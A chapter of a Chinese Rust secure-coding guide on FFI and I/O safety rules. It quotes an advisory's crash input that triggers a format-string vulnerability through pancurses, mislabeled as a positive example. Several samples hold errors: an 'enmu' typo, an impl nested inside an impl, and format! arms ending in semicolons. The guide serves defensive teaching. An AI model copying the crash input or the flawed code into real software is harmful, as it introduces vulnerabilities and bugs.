<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi01-避免从公开的-rust-api-直接传字符串到-c-中"><a class="header" href="#punsffi01-避免从公开的-rust-api-直接传字符串到-c-中">P.UNS.FFI.01 避免从公开的 Rust API 直接传字符串到 C 中</a></h2>
<p><strong>【描述】</strong></p>
<p>在跨越 C 边界的时候，应该对 字符串进行边界检查，避免传入一些非法字符串。</p>
<p><strong>【正例】</strong></p>
<p>这个示例中，从公开的 <code>Rust API</code> 传入非法字符串到 <code>C</code>，导致字符串格式化漏洞。 </p>
<pre><pre class="playground"><code class="language-rust">// From: https://github.com/RustSec/advisory-db/issues/106

extern crate pancurses;

use pancurses::{initscr, endwin};

fn main() {
    let crash = &quot;!~&amp;@%+ S&quot;; //  特意构造非法字符串

    let window = initscr();
    window.printw(crash); // 通过该函数跨 C 边界传入非法字符串，引起字符串格式化漏洞
    window.refresh();
    window.getch();
    endwin();
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi02-在使用标准库-stdffi-模块提供的类型时需要仔细查看其文档"><a class="header" href="#punsffi02-在使用标准库-stdffi-模块提供的类型时需要仔细查看其文档">P.UNS.FFI.02 在使用标准库 <code>std::ffi</code> 模块提供的类型时需要仔细查看其文档</a></h2>
<p><strong>【描述】</strong></p>
<p>因为该模块中提供了用于和其他语言类 C 字符串打交道的 FFi 绑定和类型，在使用前务必要看清楚它们的文档，否则会因为所有权管理不当而导致无效内存访问、内存泄漏和其他内存错误。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi03-当使用来自-c-的指针时如果该指针需要管理内存则需要为包装该指针的-rust-类型实现-drop-特质"><a class="header" href="#punsffi03-当使用来自-c-的指针时如果该指针需要管理内存则需要为包装该指针的-rust-类型实现-drop-特质">P.UNS.FFI.03 当使用来自 C 的指针时，如果该指针需要管理内存，则需要为包装该指针的 Rust 类型实现 Drop 特质</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 里通过结构体包装该指针，并且为该结构体实现 Drop 来保证相关资源可以安全释放。</p>
<p><strong>【正例】</strong></p>
<p>下面示例中 <code>*mut sys::VMContext</code> 是来自于外部的 <code>C-ABI</code> 指针，它需要管理内存，所以在 Rust 这边使用结构体包装该指针，并实现 <code>Drop</code>，通过 <code>Drop</code> 来调用 <code>C-ABI</code> 回调函数来释放内存。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct Vm {
    pub(crate) ctx: *mut sys::VMContext,
}

impl Drop for Vm {
    fn drop(&amp;mut self) {
        if !self.ctx.is_null() {
            unsafe { sys::VMDelete(self.ctx) };
        }
    }
}    
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi04-如果一个函数正在跨越-ffi-边界那么需要处理-panic"><a class="header" href="#punsffi04-如果一个函数正在跨越-ffi-边界那么需要处理-panic">P.UNS.FFI.04 如果一个函数正在跨越 FFi 边界，那么需要处理 Panic</a></h2>
<p><strong>【描述】</strong></p>
<p>如果让 Panic 在跨越 FFi 边界时发生，可能会产生未定义行为。</p>
<p>处理 Panic 可以使用 <code>catch_unwind</code>，但是它只对实现了 <code>UnwindSafe</code> trait 的类型起作用。另外一种方法就是避免 Panic，而返回错误码。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">use std::panic::catch_unwind;

#[no_mangle]
pub extern fn oh_no() -&gt; i32 {
    let result = catch_unwind(|| {
        panic!(&quot;Oops!&quot;); // 这里会发生 Panic，需要处理
    });
    match result {
        Ok(_) =&gt; 0,
        Err(_) =&gt; 1,
    }
}

fn main() {}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi05-建议使用诸如标准库或-libc-crate-所提供的可移植类型别名而不是特定平台的类型"><a class="header" href="#punsffi05-建议使用诸如标准库或-libc-crate-所提供的可移植类型别名而不是特定平台的类型">P.UNS.FFI.05 建议使用诸如标准库或 <code>libc</code> crate 所提供的可移植类型别名，而不是特定平台的类型</a></h2>
<p><strong>【描述】</strong></p>
<p>当与外部(如 C 或 C++)接口交互时，通常需要使用平台相关的类型，如 C 的 <code>int</code>、<code>long</code> 等。除了 <code>std::ffi</code> (或 <code>core::ffi</code> )中的 c void 外，标准库还在 <code>std:os::raw</code> (或 <code>core::os::raw</code> )中提供了可移植类型别名。<code>libc</code> crate 基本覆盖了所有的 C 标准库中的 C 兼容类型。</p>
<p>这样有助于编写跨平台的代码。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi06-rust-和-c-之间传递字符或字符串时需要注意字符串要符合-c-abi-以及-字符串的编码"><a class="header" href="#punsffi06-rust-和-c-之间传递字符或字符串时需要注意字符串要符合-c-abi-以及-字符串的编码">P.UNS.FFI.06 Rust 和 C 之间传递字符或字符串时需要注意字符串要符合 C-ABI 以及 字符串的编码</a></h2>
<p><strong>【描述】</strong></p>
<p>注意要使用 <code>c_char</code> 对应 C 语言的字符。<code>libc::c_char</code> 和 <code>std::os::raw::c_char</code> 在大多数 64位 linux 上都是相同的。</p>
<p>FFi 接口使用的字符串要符合 C 语言约定，即使用 <code>\0</code> 结尾且中间不要包含 <code>\0</code>字符的字符串。</p>
<p>Rust 中字符串要求 <code>utf-8</code> 编码，而 C 字符串则没有这个要求。所以需要注意编码。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let f = libc::fopen(&quot;/proc/uptime&quot;.as_ptr().cast(), &quot;r&quot;.as_ptr().cast());
// 即使 /proc/uptime 文件存在，fopen 系统调用也会返回 NULL
// 并且将错误码 errno 标记为 2 (&quot;No such file or directory&quot;)
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let f = libc::fopen(&quot;/proc/uptime\0&quot;.as_ptr().cast(), &quot;r\0&quot;.as_ptr().cast());
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi07--不要为任何传出外部的类型实现-drop"><a class="header" href="#punsffi07--不要为任何传出外部的类型实现-drop">P.UNS.FFI.07  不要为任何传出外部的类型实现 Drop</a></h2>
<p><strong>【描述】</strong></p>
<p>因为有可能在传出去之前被析构。需要明确是由哪种语言负责分配和释放内存，谁分配内存，谁来释放。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi08-ffi-中要进行合理的错误处理"><a class="header" href="#punsffi08-ffi-中要进行合理的错误处理">P.UNS.FFI.08 FFi 中要进行合理的错误处理</a></h2>
<p><strong>【描述】</strong></p>
<p>不同类型的错误代码，需要不同的处理方式：</p>
<ol>
<li>无字段枚举，应该转换为数字并且作为返回码。</li>
<li>数据承载（有字段）枚举，应该转换为携带错误信息的整数码。</li>
<li>自定义错误类型应该使用兼容 C 的布局</li>
</ol>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 无字段枚举
enum DatabaseError {
    IsReadOnly = 1, // user attempted a write operation
    IOError = 2, // user should read the C errno() for what it was
    FileCorrupted = 3, // user should run a repair tool to recover it
}

impl From&lt;DatabaseError&gt; for libc::c_int {
    fn from(e: DatabaseError) -&gt; libc::c_int {
        (e as i8).into()
    }
}

// 数据承载（有字段）枚举
pub mod errors {
    enum DatabaseError {
        IsReadOnly,
        IOError(std::io::Error),
        FileCorrupted(String), // message describing the issue
    }

    impl From&lt;DatabaseError&gt; for libc::c_int {
        fn from(e: DatabaseError) -&gt; libc::c_int {
            match e {
                DatabaseError::IsReadOnly =&gt; 1,
                DatabaseError::IOError(_) =&gt; 2,
                DatabaseError::FileCorrupted(_) =&gt; 3,
            }
        }
    }
}

pub mod c_api {
    use super::errors::DatabaseError;

    #[no_mangle]
    pub extern &quot;C&quot; fn db_error_description(
        e: *const DatabaseError
        ) -&gt; *mut libc::c_char {

        let error: &amp;DatabaseError = unsafe {
            // SAFETY: pointer lifetime is greater than the current stack frame
            &amp;*e
        };

        let error_str: String = match error {
            DatabaseError::IsReadOnly =&gt; {
                format!(&quot;cannot write to read-only database&quot;);
            }
            DatabaseError::IOError(e) =&gt; {
                format!(&quot;I/O Error: {}&quot;, e);
            }
            DatabaseError::FileCorrupted(s) =&gt; {
                format!(&quot;File corrupted, run repair: {}&quot;, &amp;s);
            }
        };

        let c_error = unsafe {
            // SAFETY: copying error_str to an allocated buffer with a NUL
            // character at the end
            let mut malloc: *mut u8 = libc::malloc(error_str.len() + 1) as *mut _;

            if malloc.is_null() {
                return std::ptr::null_mut();
            }

            let src = error_str.as_bytes().as_ptr();

            std::ptr::copy_nonoverlapping(src, malloc, error_str.len());

            std::ptr::write(malloc.add(error_str.len()), 0);

            malloc as *mut libc::c_char
        };

        c_error
    }
}

// 自定义错误类型
struct ParseError {
    expected: char,
    line: u32,
    ch: u16
}

impl ParseError { /* ... */ }

/* Create a second version which is exposed as a C structure */
#[repr(C)]
pub struct parse_error {
    pub expected: libc::c_char,
    pub line: u32,
    pub ch: u16
}

impl From&lt;ParseError&gt; for parse_error {
    fn from(e: ParseError) -&gt; parse_error {
        let ParseError { expected, line, ch } = e;
        parse_error { expected, line, ch }
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi09-当-rust-调用外部-c-函数时如果可以确认安全可以通过引用来代替裸指针"><a class="header" href="#punsffi09-当-rust-调用外部-c-函数时如果可以确认安全可以通过引用来代替裸指针">P.UNS.FFI.09 当 Rust 调用外部 C 函数时，如果可以确认安全，可以通过引用来代替裸指针</a></h2>
<p><strong>【描述】</strong></p>
<p>在确认安全的前提下，在声明外部 C 函数时可以直接使用引用形式， C 语言可以使用正确绑定。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi10-当-rust-函数导出外部函数时必须从设计上保证被跨线程调用的安全性"><a class="header" href="#punsffi10-当-rust-函数导出外部函数时必须从设计上保证被跨线程调用的安全性">P.UNS.FFI.10 当 Rust 函数导出外部函数时，必须从设计上保证被跨线程调用的安全性</a></h2>
<p><strong>【描述】</strong></p>
<p>当 Rust 函数被导出为外部函数接口时，要保证其被跨线程调用的安全性。除非调用它的环境是单线程。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[no_mangle]
pub extern &quot;C&quot; fn nic_udrv_suspend() {
	NIC_ENTITY.try_borrow_mut().suspend(); // suspend()需要可变引用
}

// 对外被 C 调用的接口
#[no_mangle]
pub extern &quot;C&quot; fn nic_udrv_buf_recycle(buf_id: usize) {
	NIC_ENTITY.try_borrow().buf_recycle(buf_id); // buf_recycle()内有锁可以避免多线程竞争
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi11-如需引用指定为-reprpacked-内存布局的结构体成员字段要注意合理规避未定义行为"><a class="header" href="#punsffi11-如需引用指定为-reprpacked-内存布局的结构体成员字段要注意合理规避未定义行为">P.UNS.FFI.11 如需引用指定为 <code>#[repr(packed)]</code> 内存布局的结构体成员字段要注意合理规避未定义行为</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>Rust 中的引用类型要求必须是类型对齐的，当结构体使用了 <code>#[repr(packed)]</code> 设置内部对齐方式，而外部成员的地址又不是类型对齐时，对其成员的引用会引发编译期 <code>unaligned_references</code> 的警告，该警告在将来发布的 Rust 版本中会演变为错误。</p>
<p>注： 类型对齐是指一个类型的起始地址应该是其类型大小的整数倍，如 u32 的大小是4，则 u32 所在地址 addr 需要满足 addr % 4 == 0。</p>
<p>推荐解决方法：</p>
<ol>
<li>使用 <code>raw pointer</code> 代替引用，且使用 <code>ptr::read_unaligned</code> / <code>ptr::write_unaligned</code> 函数。</li>
<li>可以复制结构体字段内容给一个本地变量，然后使用本地变量的引用。但是这个要求结构体必须实现 <code>Copy</code> trait。</li>
</ol>
<p>对第二种方法的进一步说明：</p>
<ul>
<li>结构体使用 <code>packed</code> 通常是为了匹配某种标准定义或二进制形式，在这种场景下结构体需要 <code>#[repr(C)]</code> 来稳定内存布局，通常也会通过 <code>#[derive(Copy)]</code> 来实现 <code>Copy</code> trait，这种情况不存在该问题；否则需要手动实现 <code>Copy</code> trait，或者通过增加中间变量，显示地发生 move，使用结束后再 move 回原结构体；</li>
<li>通过该方法访问的是临时拷贝的数据，那如果需要改变原数据怎么做？
<ul>
<li>若通过某个引用修改其指向的数据，则该引用一定已在某个时间点被创建，那么在创建时，若其合法，则可正常对其操作，否则在创建时就已报 <code>unaligned_references</code>，又回到了该问题，对其操作可能会造成 <code>Undefined Behavior</code>；</li>
<li>若结构体的成员地址不对齐，又需要进行修改，建议通过结构体来操作，如 <code>foo.baz = 4</code>，编译器能够完成该工作。</li>
</ul>
</li>
</ul>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![deny(unaligned_references)]

#[repr(packed)]
pub struct Foo {
    field1: u64,
    field2: u8,
}

fn main() {
    unsafe {
        let foo = Foo { field1: 0, field2: 0 };
        let _ = &amp;foo.field1; // UB Error. triggering the lint.
        println!(&quot;{}&quot;, foo.field1); // UB Error. An implicit `&amp;` is added here, triggering the lint.
    }
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>使用第二种方法。</p>
<pre><pre class="playground"><code class="language-rust">#![deny(unaligned_references)]

#[derive(Copy, Clone)]
#[repr(packed)]
pub struct Foo {
    field1: u64,
    field2: u8,
}

fn main() {
    unsafe {
        let foo = Foo { field1: 0, field2: 0 };
		let field1 = foo.field1; // 此处会 Copy field1
        let _ = &amp;field1;
        println!(&quot;{}&quot;, field1);
    }
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>是否可定制</th></tr></thead><tbody>
<tr><td>_</td><td>no</td><td>yes</td><td>_</td><td>_</td></tr>
</tbody></table>
<p><strong>【参考】</strong></p>
<p><a href="https://doc.rust-lang.org/stable/nightly-rustc/rustc_lint/builtin/static.UNALIGNED_REFERENCES.html">https://doc.rust-lang.org/stable/nightly-rustc/rustc_lint/builtin/static.UNALIGNED_REFERENCES.html</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi12-当依赖-c-端传入参数时需要在文档注释中不变性声明根据不同的调用场景选择合适的安全抽象方式"><a class="header" href="#punsffi12-当依赖-c-端传入参数时需要在文档注释中不变性声明根据不同的调用场景选择合适的安全抽象方式">P.UNS.FFI.12 当依赖 C 端传入参数时，需要在文档注释中不变性声明，根据不同的调用场景选择合适的安全抽象方式</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>当 Rust 代码中依赖 C 接口传入的参数时，比如指针或其他类型的参数，需要在文档注释中不变性声明。</p>
<p>如果在调用场景可以确定所传入的参数都是有效的，比如指针不会是空指针等情况时，我们可以通过文档注释中对该接口做不变性声明(type invariant)，来强调对依赖的 C 代码的信任，这样做的好处有两点：</p>
<ol>
<li>可以避免检查，而达到零成本安全抽象的目的。</li>
<li>可以减少 unsafe 函数声明。</li>
</ol>
<p>具体可以参考【正例】的代码注释。</p>
<p><strong>【正例】</strong></p>
<p>场景一：如果在调用场景上能确定所传入的参数都是有效时。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>/// # Invariants （不变性说明）
///
/// 这个指针来自 C语言 端，这里默认 C 端来的是有效指针，信任 C 端
/// 这种信任对性能有益：零成本（没有检查开销）
pub struct CPtr(*mut bindings::cptr);

impl CPtr {
    /// # Safety
    ///
    /// 这里使用unsafe 函数，是因为确实无法保证传入的指针是否有效，
    /// 这是构造 CPtr结构体实例的入口方法，所以有必要声明为 unsafe
    pub unsafe fn new(cptr: *mut bindings::cptr) -&gt; Self {
        Self(cptr)
    }

    // 安全性说明：这个指针已经有上面结构体定义时注释中的不变性声明来承诺安全了
    // 所以这是个方法没必要加 unsafe，因为已经有 new 方法标记为 unsafe 足以
    // 这种做法可以消除很多 unsafe 函数了
    // 同时，也不需要去检查 self.0 这个指针是不是空指针了
    pub fn get(&amp;self) -&gt; usize {
        // SAFETY: The pointer is valid by the type invariant.
        unsafe { bindings::cptr_get(self.0) as usize }
    }

    // 同上
    pub fn enable(self) -&gt; Result&lt;EnabledCPtr&gt; {
        // SAFETY: The pointer is valid by the type invariant.
        to_result(|| unsafe { bindings::cptrenable(self.0) })?;
        Ok(EnabledCPtr(self))
    }

    impl Drop for CPtr {
        // 同上
        fn drop(&amp;mut self) {
            // SAFETY: The pointer is valid by the type invariant.
            unsafe { bindings::clk_put(self.0) };
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>场景二：如果在调用场景上能无法确定所传入的参数都是有效时。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>/// # Invariants （不变性说明）
///
/// 这个指针来自 C语言 端，这里默认 C 端来的是有效指针，信任 C 端
/// 这种信任对性能有益：零成本（没有检查开销）
pub struct CPtr(*mut bindings::cptr);

impl CPtr {
    // 这里对空指针进行判断
    // 虽然抽象为了安全方法，但是如果不能panic的情况就比较麻烦，比如用 Rust 写 Linux 内核驱动
    // 或者，还需要进行错误处理，增加针对空指针的错误类型，增加复杂性
    pub fn new(cptr: *mut bindings::cptr) -&gt; Self {
        if cptr.is_null() {
            panic!(&quot;CPtr should not be null!&quot;)
        }
        Self(cptr)
    }

    // 因为 new 已经安全了，所以这个方法也安全
    pub fn get(&amp;self) -&gt; usize {
        // SAFETY: The pointer is valid by the type invariant.
        unsafe { bindings::cptr_get(self.0) as usize }
    }

    // 同上
    pub fn enable(self) -&gt; Result&lt;EnabledCPtr&gt; {
        // SAFETY: The pointer is valid by the type invariant.
        to_result(|| unsafe { bindings::cptrenable(self.0) })?;
        Ok(EnabledCPtr(self))
    }

    impl Drop for CPtr {
        // 同上
        fn drop(&amp;mut self) {
            // SAFETY: The pointer is valid by the type invariant.
            unsafe { bindings::clk_put(self.0) };
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi13-自定义数据类型要保证一致的数据布局"><a class="header" href="#punsffi13-自定义数据类型要保证一致的数据布局">P.UNS.FFI.13 自定义数据类型要保证一致的数据布局</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 编译器为了优化内存布局，会对结构体字段进行重排。所以在 FFi 边界，应该注意结构体内存布局和 C 语言的一致。</p>
<p>关于 如何选择合适的 <code>repr</code> 属性可参考：<a href="safe-guides/coding_practice/unsafe_rust/ffi/../mem.html">P.UNS.MEM.01</a> </p>
<p>以下是不适合用于和 C 语言交互的类型：</p>
<ol>
<li>没有使用任何 <code>#[repr( )]</code> 属性修饰的自定义类型</li>
<li>动态大小类型 (dynamic sized type)</li>
<li>指向动态大小类型对象的指针或引用 (fat pointers)</li>
<li>str 类型、tuple 元组、闭包类型</li>
</ol>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[repr(C)]
struct Data {
    a: u32,
    b: u16,
    c: u64,
}
#[repr(C, packed)]
struct PackedData {
    a: u32,
    b: u16,
    c: u64,
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi14-在-ffi-中使用的类型应该拥有稳定布局"><a class="header" href="#punsffi14-在-ffi-中使用的类型应该拥有稳定布局">P.UNS.FFI.14 在 FFi 中使用的类型应该拥有稳定布局</a></h2>
<p><strong>【描述】</strong></p>
<p><strong>FFi-Safe</strong>: 通过 FFi 外部传递的结构体类型都要满足内存布局的稳定性。</p>
<p>为结构体添加 <code>#[repr(C)]</code> 或 <code>#[repr(transparent)]</code> 可以让结构体拥有稳定的布局。</p>
<p>零大小类型在 C 中是无效的。也不要把 Rust 中的单元类型 <code>()</code> 和 C 中的 <code>void</code> 混为一谈。所以不应该在 FFi 中使用零大小类型（ZST）。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Foo 为零大小类型
// No FFi Safe
#[repr(C)]
pub struct Foo;

extern {
	fn get_some_instance() -&gt; *mut Foo;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 如果 C 函数需要 opaque 类型，可以使用 libc::c_void 解决
extern crate libc;

extern &quot;C&quot; {
	pub fn foo(arg: *mut libc::c_void);
	pub fn bar(arg: *mut libc::c_void);
}

// 如果一定要使用零大小类型，比如 C 函数中返回一个结构体指针
// 可以按下面这种方式
#[repr(C)]
pub struct Foo { _unused: [u8; 0]}

// 理论上上面结构体应该是下面空枚举的一种等价模拟，因为现在 Rust 编译器还不支持给空枚举设置布局
// #[repr(C)]
pub enmu Foo{};

extern {
	fn get_some_instance() -&gt; *mut Foo;
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsffi15-从外部传入的不健壮类型的外部值要进行检查"><a class="header" href="#punsffi15-从外部传入的不健壮类型的外部值要进行检查">P.UNS.FFI.15 从外部传入的不健壮类型的外部值要进行检查</a></h2>
<p><strong>【描述】</strong></p>
<p>Safe Rust 会保证类型的有效性和安全性，但是 Unsafe Rust 中，特别是编写 FFi 的时候，很容易从外部传入无效值。</p>
<p>Rust 中很多类型都不太健壮：</p>
<ul>
<li>布尔类型。外部传入的布尔类型可能是数字也可能是字符串。</li>
<li>引用类型。Rust 中的引用仅允许执行有效的内存对象，但是在Unsafe 中使用引用，任何偏差都可能引起未定义行为。</li>
<li>函数指针。跨越 FFi 边界的函数指针可能导致任意代码执行。</li>
<li>Enum。 跨 FFi 边界两端的 枚举值要经过合法转换。</li>
<li>浮点数。</li>
<li>包含上述类型的复合类型</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="punsffi16-给-c-接口传递-rust-闭包时需要将数据和代码进行分离并要保证其安全性"><a class="header" href="#punsffi16-给-c-接口传递-rust-闭包时需要将数据和代码进行分离并要保证其安全性">P.UNS.FFI.16 给 C 接口传递 Rust 闭包时需要将数据和代码进行分离，并要保证其安全性</a></h1>
<h2 id="描述"><a class="header" href="#描述">【描述】</a></h2>
<p>在 Rust 中，闭包只是一种语法糖，其实质是由编译器生成的匿名结构体和一些 <code>call</code>方法组成。而 C 语言中只支持函数指针，并不支持 Rust 这种闭包。</p>
<p>因此为 C 接口传递 Rust 闭包的思路是将闭包“拆分”为数据（匿名结构体的实例）和函数（<code>call()</code>方法）部分来将闭包传递给 C 接口，并且要从以下三方面保证安全性：</p>
<ol>
<li>Rust 闭包中捕获变量引用的生命周期有效性。</li>
<li>传入的Rust 闭包要实现 <code>std::panic::UnwindSafe</code>，这样可以保证异常安全</li>
<li>传入的 Rust 闭包要实现 <code>Send</code>，这样可以保证线程安全</li>
</ol>
<h2 id="正例"><a class="header" href="#正例">【正例】</a></h2>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Safety: 此处需要保证以下不变性来进行安全抽象
// - widget 必须是一个有效的指针
//    - 这里因为使用 Rust 引用，所以它一定是有效的
// - 数据必须在其被析构之前有效
//     - 这里增加了`'static` 限定来确保它有效
// - 增加 `std::panic::UnwindSafe` 和 `Send` 限定，确保其异常安全和线程安全
fn register_c_callback&lt;F&gt;(widget: &amp;mut ffi::widget_t, callback: F)
where
    F: FnMut(ffi::event_t) + 'static + std::panic::UnwindSafe + Send,
{
    // 需要闭包实例数据保留一定时间，所以将其放到堆上，使用`Box::into_raw`防止其被析构 
    let data = Box::into_raw(Box::new(callback)); 
    unsafe {
        // 分别将 数据 和 闭包调用代码 传入 C 接口
        ffi::widget_register_callback(
            widget,
            data as *mut _, // 数据
            call_closure::&lt;F&gt;, // 代码
            drop_box::&lt;F&gt;,
        );
    }
}

// Safety: 传入该函数的指针必须是 `F` 类型的非空指针
// 这里不需要 `#[no_mangle]`，是因为它会以函数指针的方式直接传递给 C ，而不需要通过函数名称调用
unsafe extern &quot;C&quot; fn call_closure&lt;F&gt;(
    data: *mut libc::c_void,
    event: ffi::event_t,
)
where
    F: FnMut(ffi::event_t) + 'static + std::panic::UnwindSafe + Send,
{
    let callback_ptr = data as *mut F;
    let callback = &amp;mut *callback_ptr;
    callback(event); // 调用闭包
}

// 在 C 端手动调用的析构函数
unsafe extern &quot;C&quot; fn drop_box&lt;T&gt;(data: *mut libc::c_void) {
    Box::from_raw(data as *mut T);
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="punsffi17-当rust绑定c-api不透明opaque类型时应该使用指向专用不透明类型的指针而不是c_void指针"><a class="header" href="#punsffi17-当rust绑定c-api不透明opaque类型时应该使用指向专用不透明类型的指针而不是c_void指针">P.UNS.FFI.17 当Rust绑定C-API不透明(Opaque)类型时，应该使用指向专用不透明类型的指针而不是<code>c_void</code>指针</a></h1>
<h2 id="描述-1"><a class="header" href="#描述-1">【描述】</a></h2>
<p>使用专门构建的不透明类型相比于直接使用 <code>c_void</code>可以提供一定程度的类型安全性。</p>
<h2 id="正例-1"><a class="header" href="#正例-1">【正例】</a></h2>
<p>C 库中包含了一个不透明类型的 foo 指针和 bar 指针：</p>
<pre><code class="language-c">void foo(void *arg);
void bar(void *arg);
</code></pre>
<p>通过包含私有字段<code>_private</code>且不包含构造函数，创建了两个无法在此模块之外实例化的不透明类型。空数组既是零大小又可设置布局为<code>#[repr(C)]</code>。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[repr(C)]
pub struct Foo {_private: [u8; 0]}

#[repr(C)]
pub struct Bar {_private: [u8; 0]}


// SAFETY: 
//  因为 Foo 和 Bar类型不同，所以将在它们两者之间获得类型安全，这样就不可能意外地传递一个指向 `bar()` 的`Foo`指针。
extern &quot;C&quot; {
    fn foo(arg: *mut Foo); 
    fn bar(arg: *mut Bar);
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="punsffi18-避免将-trait-对象传递给-c-接口"><a class="header" href="#punsffi18-避免将-trait-对象传递给-c-接口">P.UNS.FFI.18 避免将 trait 对象传递给 C 接口</a></h1>
<h2 id="描述-2"><a class="header" href="#描述-2">【描述】</a></h2>
<p>Rust 中的多态性主要由 trait 来提供。但是在 FFi 时，将 Rust trait 对象传递给 C 接口，并不能保证 FFi 安全。因为 Rust trait 对象没有稳定的 ABI，所以我们不能通过 <code>Box&lt;dyn Trait&gt;</code> 值传递越过 FFI 边界。</p>
<p>所以，最好的方式是不要在 FFi 时通过传递 trait对象来使用多态性。</p>
<blockquote>
<p>如果必须要在 FFi 中使用多态性，有以下几种方式：</p>
<ol>
<li>使用枚举。像 C 传递一个指向枚举的指针。</li>
<li>使用 <a href="https://github.com/kotauskas/thin_trait_object"><code>thin_trait_object</code></a> 模式，是 FFi 安全的。</li>
</ol>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="unsafe-io"><a class="header" href="#unsafe-io">Unsafe I/O</a></h1>
<p>Rust 标准库提供了 I/O 安全性，保证程序持有私有的原始句柄（raw handle），其他部分无法访问它。但是 <code>FromRawFd::from_raw_fd</code> 是 Unsafe 的，所以在 Safe Rust中无法做到 <code>File::from_raw(7)</code> 这种事。 在这个文件描述符上面进行<code> I/O</code> 操作，而这个文件描述符可能被程序的其他部分私自持有。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="punsfio01--在使用原始句柄的时候要注意-io-安全性"><a class="header" href="#punsfio01--在使用原始句柄的时候要注意-io-安全性">P.UNS.FIO.01  在使用原始句柄的时候，要注意 I/O 安全性</a></h2>
<p><strong>【描述】</strong></p>
<p>很多 API 通过接受原始句柄来进行 I/O 操作：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn do_some_io&lt;FD: AsRawFd&gt;(input: &amp;FD) -&gt; io::Result&lt;()&gt; {
    some_syscall(input.as_raw_fd())
}
<span class="boring">}
</span></code></pre></pre>
<p><code>AsRawFd</code>并没有限制<code>as_raw_fd</code>的返回值，所以<code>do_some_io</code>最终可以在任意的<code>RawFd</code>值上进行 <code>I/O </code>操作。甚至可以写<code>do_some_io(&amp;7)</code>，因为<code>RawFd</code>本身实现了<code>AsRawFd</code>。这可能会导致程序访问错误的资源。甚至通过创建在其他部分私有的句柄别名来打破封装边界，导致一些诡异的 远隔作用（Action at a distance）。</p>
<blockquote>
<p><strong>远隔作用</strong>（<strong>Action at a distance</strong>）是一种程式设计中的<a href="https://zh.wikipedia.org/wiki/%E5%8F%8D%E6%A8%A1%E5%BC%8F">反模式</a>，是指程式某一部分的行为会广泛的受到程式其他部分<a href="https://zh.wikipedia.org/wiki/%E6%8C%87%E4%BB%A4">指令</a>的影响，而且要找到影响其他程式的指令很困难，甚至根本无法进行。</p>
</blockquote>
<p>在一些特殊的情况下，违反 I/O 安全甚至会导致内存安全。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="unsafe-代码术语指南"><a class="header" href="#unsafe-代码术语指南">Unsafe 代码术语指南</a></h2>
